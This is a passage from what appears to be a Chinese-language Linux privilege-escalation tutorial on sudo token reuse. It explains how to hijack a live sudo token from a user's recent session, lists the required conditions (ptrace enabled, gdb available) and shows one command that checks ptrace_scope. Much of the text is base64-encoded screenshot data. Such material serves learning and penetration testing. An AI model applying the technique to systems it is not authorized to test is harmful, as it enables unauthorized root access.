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" width="404" height="48" class="img_ev3q"></p>
<p>此时，我们应该开始在系统中寻找用户密码；不过，在本例中，我们将寻找令牌重用的机会。</p>
<blockquote>
<p>如果你有一个具有 sudo 权限的用户 shell，但不知道该用户的密码，你可以等待他/她使用 sudo 执行某些命令来创建令牌。令牌创建后，你就可以从 sudo 的会话中访问令牌，并使用它执行任何带有 sudo 的命令。</p>
</blockquote>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="42sudo-令牌重用条件"><strong><div id="id4.2">4.2、Sudo 令牌重用条件</div></strong><a href="#42sudo-令牌重用条件" class="hash-link" aria-label="42sudo-令牌重用条件的直接链接" title="42sudo-令牌重用条件的直接链接">​</a></h4>
<p>值得注意的是，必须满足一些条件才能利用此漏洞。</p>
<ul>
<li>我们需要有一个拥有sudo权限的用户的shell</li>
<li>同一用户必须拥有一个具有有效 sudo 令牌的活动进程（shell +在过去 15 分钟内运行<strong>sudo ）</strong></li>
<li>Ptrace需要完全启用</li>
<li>主机上需要有 gbd 命令（如果主机上没有 gbd，可将其复制过来）</li>
</ul>
<p>现在我们知道了此漏洞利用所需的条件，让我们看看如何手动或使用 LinPEAS 来枚举条件。</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="43手动寻找-sudo-令牌重用条件"><strong><div id="id4.3">4.3、手动寻找 Sudo 令牌重用条件</div></strong><a href="#43手动寻找-sudo-令牌重用条件" class="hash-link" aria-label="43手动寻找-sudo-令牌重用条件的直接链接" title="43手动寻找-sudo-令牌重用条件的直接链接">​</a></h4>
<p>由于我们已经确认当前用户具有<strong>sudo</strong>权限，因此我们可以继续检查 Ptrace 的状态。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cat /proc/sys/kernel/yama/ptrace_scope</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="data:image/png;base64,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